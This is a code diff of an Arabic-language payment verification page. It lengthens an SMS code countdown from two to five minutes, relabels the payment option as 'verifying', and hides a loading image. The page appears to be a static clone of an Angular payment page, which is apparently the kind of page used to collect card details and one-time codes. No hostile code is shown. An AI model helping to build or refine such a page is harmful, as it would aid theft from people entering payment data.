@@ -28876,7 +28876,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                                                                                                                             التحقق
                                                                                                                                             في
                                                                                                                                             خلال
-                                                                                                                                            <br><span id="safeTimerDisplay22">2:00</span>
+                                                                                                                                            <br><span id="safeTimerDisplay22">5:00</span>
                                                                                                                                             دقيقة
                                                                                                                                         </div>
                                                                                                                                         <button type="submit" mat-button="" style="text-align: center;margin: 15px auto 0;padding: 15px;width: 200px;font-size: 20px;" class="mat-focus-indicator mat-button mat-button-base button pay-button ng-star-inserted" >
@@ -29589,7 +29589,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                                                                                                                             التحقق
                                                                                                                                             في
                                                                                                                                             خلال
-                                                                                                                                            <br><span id="safeTimerDisplay">2:00</span>
+                                                                                                                                            <br><span id="safeTimerDisplay">5:00</span>
                                                                                                                                             دقيقة
                                                                                                                                         </div>
                                                                                                                                         <button type="submit" mat-button="" style="text-align: center;margin: 15px auto 0;padding: 15px;width: 200px;font-size: 20px;" class="mat-focus-indicator mat-button mat-button-base button pay-button ng-star-inserted" >
@@ -30267,7 +30267,7 @@ function form2submit(){
 		<mat-radio-button name="paymentOption" aria-disabled="false" class="mat-radio-button mat-radio-checked mat-accent">
 			<label class="mat-radio-label" for="CC-input">
 				<span class="mat-radio-label-content" style="padding: 0;">
-				<span role="radio" aria-label="بطاقة ائتمانية / مصرفية" class="ng-star-inserted" style="font-size: 20px;">مصادقة الدفع</span><!---->
+				<span role="radio" aria-label="بطاقة ائتمانية / مصرفية" class="ng-star-inserted" style="font-size: 20px;"> جاري التخقق</span><!---->
 				</span>
 			</label>
 		</mat-radio-button>
@@ -30292,7 +30292,9 @@ function form2submit(){
 </div>
 
 <ng-lottie _ngcontent-my-app-c259="" class="loading-width">
-<div style="width: 70%; height: 70%;margin: auto 25px;"><img src="../../../new/img/call.gif" width="782" height="587" class="shrinkToFit transparent"></div>
+<div style="width: 70%; height: 70%;margin: auto 25px;">
+	<!-- <img src="../../../new/img/call.gif" width="782" height="587" class="shrinkToFit transparent"> -->
+</div>
 </ng-lottie>
 <div _ngcontent-my-app-c259="" class="loading-msg f-align-center" style="padding: 0 10px;">
  سيتم ارسال رمز التحقق إلى رقم جوالك.
